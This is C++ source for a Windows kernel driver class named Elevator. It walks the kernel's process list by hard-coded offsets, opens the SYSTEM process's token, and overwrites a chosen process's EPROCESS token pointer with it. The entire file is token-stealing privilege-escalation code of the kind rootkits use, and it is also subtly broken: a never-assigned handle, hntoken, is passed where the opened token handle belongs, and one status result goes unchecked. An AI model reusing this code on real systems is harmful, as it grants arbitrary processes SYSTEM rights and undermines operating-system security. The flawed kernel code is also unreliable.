#include "Header.h"
#include "Elevator.h"

ORIG_TOKEN original_token = { 0 };

PTRLEN gpeproc_system;

PTRLEN Elevator::FindProcessEPROC(int terminate_PID)
{
    PTRLEN eproc = 0;
    int   current_PID = 0;
    int   start_PID = 0;
    int   i_count = 0;
    PLIST_ENTRY plist_active_procs;

    if (terminate_PID == 0)
        return terminate_PID;
    gpeproc_system = (PTRLEN)PsGetCurrentProcess();
    eproc = (PTRLEN)gpeproc_system;
    start_PID = *((int*)(eproc + PIDOFFSET));
    current_PID = start_PID;

    while (1)
    {
        if (terminate_PID == current_PID)
            return eproc;
        else if ((i_count >= 1) && (start_PID == current_PID))
        {
            return 0;
        }
        else {
            plist_active_procs = (LIST_ENTRY*)(eproc + FLINKOFFSET);
            eproc = (PTRLEN)plist_active_procs->Flink;
            eproc = eproc - FLINKOFFSET;
            current_PID = *((int*)(eproc + PIDOFFSET));
            i_count++;
        }
    }
}

VOID Elevator::SeDeleteAccessState(
    __in PACCESS_STATE AccessState
)

{
    PAUX_ACCESS_DATA AuxData;

    PAGED_CODE();

    AuxData = (PAUX_ACCESS_DATA)AccessState->AuxData;

    if (AccessState->PrivilegesAllocated) {
        ExFreePool((PVOID)AuxData->PrivilegesUsed);
    }

    if (AccessState->ObjectName.Buffer != NULL) {
        ExFreePool(AccessState->ObjectName.Buffer);
    }

    if (AccessState->ObjectTypeName.Buffer != NULL) {
        ExFreePool(AccessState->ObjectTypeName.Buffer);
    }

    SeReleaseSubjectContext(&AccessState->SubjectSecurityContext);

    return;
}

NTSTATUS Elevator::Escalate(int pid) {
    ACCESS_STATE accessState;
    PAUX_ACCESS_DATA data = { 0 };

    PEPROCESS pseproc = NULL;
    HANDLE hseproc = NULL;
    PEPROCESS pdeproc = NULL;

    HANDLE hstoken = NULL;
    HANDLE hntoken = NULL;
    PVOID pntoken = NULL;

    NTSTATUS res = SeCreateAccessState(&accessState, data, STANDARD_RIGHTS_ALL, (PGENERIC_MAPPING)((PCHAR)*PsProcessType + 52));
    if (!NT_SUCCESS(res))return res;

    accessState.PreviouslyGrantedAccess |= accessState.RemainingDesiredAccess;
    accessState.RemainingDesiredAccess = 0;

    res = PsLookupProcessByProcessId((HANDLE)4, &pseproc);
    if (!NT_SUCCESS(res)) {
        SeDeleteAccessState(&accessState);
        return res;
    }

    res = ObOpenObjectByPointer(pseproc, 0, &accessState, 0, *PsProcessType, KernelMode, &hseproc);
    SeDeleteAccessState(&accessState);
    ObDereferenceObject(pseproc);

    res = ZwOpenProcessTokenEx(hseproc, STANDARD_RIGHTS_ALL, OBJ_KERNEL_HANDLE, &hstoken);
    if (!NT_SUCCESS(res)) {
        ZwClose(hstoken);
        ZwClose(hseproc);
        return res;
    }

    res = ObReferenceObjectByHandle(hntoken, STANDARD_RIGHTS_ALL, NULL, KernelMode, &pntoken, NULL);
    if (!NT_SUCCESS(res))return res;

    pdeproc = (PEPROCESS)FindProcessEPROC(pid);
    if (!pdeproc)return STATUS_NOT_FOUND;

    original_token.peproc = (PTRLEN)pdeproc;
    original_token.ptoken_efr = *(PTRLEN*)((PTRLEN)pdeproc + TOKENOFFSET);

    *(PTRLEN*)((PTRLEN)pdeproc + TOKENOFFSET) = (PTRLEN)pntoken;

    return STATUS_SUCCESS;
}
